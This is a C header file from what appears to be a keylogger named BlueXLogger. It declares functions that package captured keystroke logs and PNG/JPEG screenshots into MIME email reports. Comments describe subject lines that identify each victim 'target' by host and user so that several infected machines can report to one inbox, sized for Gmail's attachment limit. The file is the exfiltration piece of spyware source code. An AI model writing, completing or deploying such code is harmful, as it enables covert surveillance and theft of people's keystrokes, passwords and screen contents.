/*============================================================================
 * BlueXLogger - bxl_mime.h
 * RFC 5322 / MIME message construction.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Message shape (chosen to be valid in every combination):
 *
 *   no HTML, no attachments -> text/plain
 *   HTML, no attachments    -> multipart/alternative
 *   attachments             -> multipart/mixed
 *                                |- multipart/alternative | text/plain
 *                                |- image/png  (base64)
 *                                |- image/jpeg (base64)
 *
 * Bodies are base64 encoded UTF-8, which sidesteps quoted-printable line
 * length hazards entirely and keeps arbitrary captured text safe.
 *==========================================================================*/
#ifndef BXL_MIME_H
#define BXL_MIME_H

#include "bxl_common.h"
#include "bxl_config.h"
#include "bxl_util.h"
#include "bxl_identity.h"

#define BXL_MAX_ATTACHMENTS 32

typedef struct BxlAttachment {
    char        filename[256];
    char        mime_type[96];
    const void *data;
    size_t      len;
} BxlAttachment;

typedef struct BxlMessage {
    char    from[BXL_MAX_EMAIL];
    char    to[BXL_MAX_EMAIL];
    char    subject[BXL_MAX_SUBJECT];
    bxl_u64 date_unix;

    const char *body_text;      /* UTF-8, NUL-terminated                    */
    size_t      body_text_len;
    const char *body_html;      /* UTF-8 or NULL                            */
    size_t      body_html_len;

    const BxlAttachment *atts;
    size_t               att_count;
} BxlMessage;

/* Build the complete message including headers, terminated with CRLF.CRLF
 * NOT included - the SMTP layer appends the terminating dot. */
int bxl_mime_build(const BxlMessage *msg, BxlBuf *out);

/* Approximate wire size after base64 expansion, for Gmail's 25 MB budget. */
size_t bxl_mime_estimate_size(const BxlMessage *msg);

/* Compose the standard report subject line. The host/user pair is what makes
 * two targets distinguishable when several are delivering to one inbox:
 *   "BlueXLogger report - boobies/alice - 2026-09-13 14:32:07"               */
int bxl_mime_make_subject(char *out, size_t out_cch, const char *prefix,
                          const BxlIdentity *id, bxl_u64 unix_now);

/* Render the standard plaintext report body. `log_text` may be NULL.
 * `id` may be NULL, in which case every identity field reads "unknown". */
int bxl_mime_make_body(char *out, size_t out_cch, const BxlIdentity *id,
                       bxl_u64 unix_now,
                       const char *log_text, size_t log_len,
                       unsigned screenshot_count);

/* Render the HTML alternative of the same report. */
int bxl_mime_make_body_html(char *out, size_t out_cch, const BxlIdentity *id,
                            bxl_u64 unix_now,
                            const char *log_text, size_t log_len,
                            unsigned screenshot_count);

/* Sanitise a header value in place: strips CR/LF (header injection defence). */
void bxl_mime_sanitize_header(char *s);

#endif /* BXL_MIME_H */
